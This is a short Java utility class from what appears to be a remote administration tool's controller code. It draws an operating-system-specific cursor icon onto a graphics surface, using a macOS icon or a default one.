package jrat.controller.utils;

import jrat.api.Resources;
import oslib.OperatingSystem;

import java.awt.*;

public class CursorUtils {

	/**
	 * Draw cursor
	 * @param os gets matching icon for operating system
	 * @param g Graphics to paint the cursor on
	 * @param x coordinate
	 * @param y coordinate
	 */
	public static void drawCursor(OperatingSystem os, Graphics2D g, int x, int y) {
		String icon;

		if (os == OperatingSystem.MACOS) {
			icon = "cursor-osx";
		} else {
			icon = "cursor-default";
		}

		g.drawImage(Resources.getIcon(icon).getImage(), x, y, null);
	}
}
